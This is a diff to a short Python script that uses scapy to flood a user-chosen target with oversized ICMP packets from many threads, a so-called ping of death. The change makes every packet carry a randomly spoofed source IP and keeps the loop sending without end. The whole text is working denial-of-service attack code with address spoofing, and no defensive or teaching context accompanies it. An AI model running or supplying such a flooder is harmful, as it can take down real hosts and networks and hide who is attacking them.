@@ -2,23 +2,21 @@ from ast import While
 from scapy.all import *
 import threading
 
-ip = input("IP: ")
-thr = int(input("Thread: "))
+target = input("Enter the target to attack: ")
+thr = int(input("Threading: "))
 
-def PoD (ip, i):
+
+def PoD (target, i):
     while True:
-        print('Thread:', i)
-        SOURCE_IP="192.168.2.102"
-        TARGET_IP=ip
-        MESSAGE="T"
-        NUMBER_PACKETS=5
-
-        pingOFDeath = IP(src=SOURCE_IP, dst=TARGET_IP)/ICMP()/(MESSAGE*60000)
-        send(NUMBER_PACKETS*pingOFDeath)
+        print("Threading: ", i)
+        rand_addr = RandIP()
+        ip_hdr = IP(src=rand_addr, dst=target)
+        packet = ip_hdr/ICMP()/("m"*60000) #send 60k bytes of junk
+        send(packet)
 
 
 thrList = list()
 for i in range(thr):
-    thrPoD = threading.Thread(target = PoD, args = (ip, i,))
+    thrPoD = threading.Thread(target = PoD, args = (target, i,))
     thrList.append(thrPoD)
     thrPoD.start()
